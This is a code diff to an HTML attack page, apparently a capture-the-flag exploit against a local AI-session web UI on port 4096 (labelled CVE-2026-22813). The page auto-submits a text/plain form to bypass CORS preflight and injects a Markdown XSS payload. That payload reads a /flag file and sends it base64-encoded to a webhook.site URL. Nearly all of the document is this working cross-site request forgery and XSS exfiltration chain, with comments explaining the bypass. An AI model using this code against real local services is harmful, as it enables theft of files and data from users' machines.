@@ -3,40 +3,36 @@
 <body>
     <script>
         const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";
-        const LOCAL_UI = "http://127.0.0.1:4096";
-        const SESSION_ID = "default"; // 1.2.16 默认会话 ID
+        const TARGET = "http://127.0.0.1:4096/session/default/prompt";
 
-        // 注入包含 XSS 的 Markdown 负载
-        // 这里的脚本会在 localhost 环境下运行，读取 flag 并外传
-        const xssPayload = `
-<img src=x onerror="
-    fetch('/file/content?path=/flag')
-    .then(r=>r.json())
-    .then(d=>fetch('${WEBHOOK}?flag='+btoa(d.content)))
-">`;
+        // CVE-2026-22813: Markdown XSS Payload
+        // 这段脚本运行在 localhost 域下，不再受 CORS/PNA 限制
+        const xss = `<img src=x onerror="fetch('/file/content?path=/flag').then(r=>r.json()).then(d=>fetch('${WEBHOOK}?f='+btoa(d.content)))">`;
 
-        function doAttack() {
-            // 使用 Form 提交绕过 PNA/CORS 预检
+        // 构造完美的 JSON 格式 (利用 dummy 键吸收结尾的 '=')
+        const payload = JSON.stringify({
+            "prompt": xss,
+            "dummy": "
+        }).replace(/}$/, ''); // 去掉最后一个括号，让 form 自动补全
+
+        function attack() {
             const f = document.createElement('form');
-            f.action = `${LOCAL_UI}/session/${SESSION_ID}/prompt`;
+            f.action = TARGET;
             f.method = 'POST';
-            f.enctype = 'text/plain';
-            
+            f.enctype = 'text/plain'; // 避免触发预检请求
+
             const i = document.createElement('input');
-            // 构造符合 API 要求的 JSON 格式，注意闭合
-            i.name = JSON.stringify({ "prompt": xssPayload });
-            i.value = "";
+            // 提交的内容将是: {"prompt":"...","dummy":"=
+            // 服务器端接收到的将是有效的 JSON 片段
+            i.name = payload; 
+            i.value = '"}'; // 闭合 JSON
             
             f.appendChild(i);
             document.body.appendChild(f);
-            
-            // 提交后，Bot 的浏览器会导航到 Web UI，渲染 XSS 并执行
             f.submit();
         }
 
-        // 延迟执行确保页面加载
-        setTimeout(doAttack, 1000);
+        setTimeout(attack, 1000);
     </script>
-    <h1>Loading Session...</h1>
 </body>
 </html>
